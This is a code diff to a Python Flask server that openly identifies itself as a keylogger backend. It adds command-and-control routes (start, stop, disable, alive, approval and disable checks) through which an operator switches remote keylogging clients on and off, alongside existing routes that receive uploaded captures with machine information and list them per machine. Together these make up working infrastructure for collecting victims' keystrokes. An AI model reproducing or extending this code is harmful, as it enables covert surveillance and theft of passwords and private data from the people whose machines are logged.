@@ -8,17 +8,29 @@ import json
 
 app = Flask(__name__)
 CORS(app)
-DATA_FOLDER = 'data'
+DATA_FOLDER = 'data'                                                                # Choose the name of the folder where the data will be saved
 BASE_DIR = os.path.join(os.path.dirname(__file__), DATA_FOLDER)
 
-# Make sure base "data" folder exists
-if not os.path.exists(DATA_FOLDER):
+current_status = "Not Running"
+approval_granted = False
+disabled = False
+
+
+if not os.path.exists(DATA_FOLDER):                                                 # Make sure base "data" folder exists
     os.makedirs(DATA_FOLDER)
 
+def generate_log_filename():
+    """Generates a unique filename for the log file."""
+    return "log_" + time.strftime("%Y-%m-%d_%H-%M-%S") + ".txt"
 
+#----------------------------- frontend func ------------------------------------------
 @app.route('/')
 def home():
     return "KeyLogger Server is Running"
+
+@app.route('/status')
+def get_status():
+    return jsonify({'status': current_status})
 
 @app.route("/data")
 def list_computers():
@@ -31,7 +43,6 @@ def list_computers():
         return jsonify(data)
     except Exception as e:
         return jsonify({"error": str(e)}), 500
-
 
 @app.route("/data/<name>")
 def get_computer_content(name):
@@ -50,10 +61,55 @@ def get_computer_content(name):
 
     return jsonify({"content": content_dict})
 
-def generate_log_filename():
-    """Generates a unique filename for the log file."""
-    return "log_" + time.strftime("%Y-%m-%d_%H-%M-%S") + ".txt"
+@app.route('/start', methods=['GET'])
+def start_script():
+    global approval_granted
+    global current_status
+    approval_granted = True
+    current_status = "running"
+    print("Approval granted. The script can now continue.")
+    return jsonify({'message': 'Approval granted'})
 
+@app.route('/stop', methods=['GET'])
+def stop_script():
+    global approval_granted
+    global current_status
+    approval_granted = False
+    current_status = "Alive waiting for orders"
+    print("Approval denied.")
+    return jsonify({'message': 'Approval denied'})
+
+@app.route('/disable', methods=['GET'])
+def disable():
+    global disabled
+    global approval_granted
+    global current_status
+    approval_granted = False
+    current_status = "disabled"
+    disabled = True
+    print("keylog disabled")
+    return jsonify({'message': 'keylog disabled'})
+
+
+#------------------------------ keylogger func ------------------------------------------
+
+
+@app.route('/alive', methods=['POST'])
+def alive_script():
+    global disabled
+    global current_status
+    disabled = False
+    current_status = "Alive waiting for orders"
+    print("Script started. Status updated.")
+    return jsonify({'message': 'Status updated to Running'})
+
+@app.route('/check-disable', methods=['GET'])
+def check_disable():
+    return jsonify({'disable': disabled})
+
+@app.route('/check-approval', methods=['GET'])
+def check_approval():
+    return jsonify({'approved': approval_granted})
 
 @app.route('/api/upload', methods=['POST'])
 def upload():
@@ -91,8 +147,7 @@ def upload():
     if not os.path.exists(machine_folder):
         os.makedirs(machine_folder)
 
-    # Check if "info" file exists, create it if it doesn't
-    info_file_path = os.path.join(machine_folder, "info")
+    info_file_path = os.path.join(machine_folder, "info")                              # Check if "info" file exists, create it if it doesn't
     if not os.path.exists(info_file_path):
         with open(info_file_path, "w") as f:
             json.dump(data["machine_info"], f, indent=4)
@@ -107,29 +162,7 @@ def upload():
         return jsonify({"error": f"Failed to write to file: {str(e)}"}), 500
 
     return jsonify({"status": "success", "file": datafile}), 200
-# commands = {}  # In-memory storage for commands per machine
 
-# @app.route('/api/command/<name>', methods=['POST'])
-# def set_command(name):
-#     data = request.get_json()
-#     if not data or "command" not in data:
-#         return jsonify({"error": "Invalid payload: command required"}), 400
-#     cmd = data["command"]
-#     if cmd not in ["start", "stop"]:
-#         return jsonify({"error": "Invalid command"}), 400
-#     commands[name] = cmd
-#     return jsonify({"message": f"Command '{cmd}' set for {name}"})
-#
-# @app.route('/api/command/<name>', methods=['GET'])
-# def get_command(name):
-#     cmd = commands.get(name, "none")
-#     # Optionally clear after reading: del commands[name]
-#     return jsonify({"command": cmd})
-#
-# @app.route('/api/status/<name>', methods=['GET'])
-# def get_status(name):
-#     # This is placeholder; implement actual status tracking if needed
-#     return jsonify({"status": "running" if commands.get(name) == "start" else "stopped"})
 
 if __name__ == '__main__':
     app.run(host="127.0.0.1", port=5000, debug=True)
